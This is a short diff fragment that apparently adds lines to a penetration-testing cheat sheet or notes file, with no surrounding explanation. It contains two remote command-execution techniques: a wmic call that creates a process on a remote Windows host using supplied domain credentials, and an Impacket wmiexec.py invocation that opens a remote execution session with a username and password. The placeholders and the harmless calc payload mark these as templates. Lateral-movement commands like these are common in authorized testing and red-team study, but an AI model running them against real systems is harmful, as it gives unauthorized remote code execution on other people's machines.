@@ -1,0 +1,3 @@
+wmic /node:"IP_TARGET" /user:"domain\user" /password:"password" process call create "cmd.exe /c calc"
+
+wmiexec.py domain/user:password@IP_TARGET
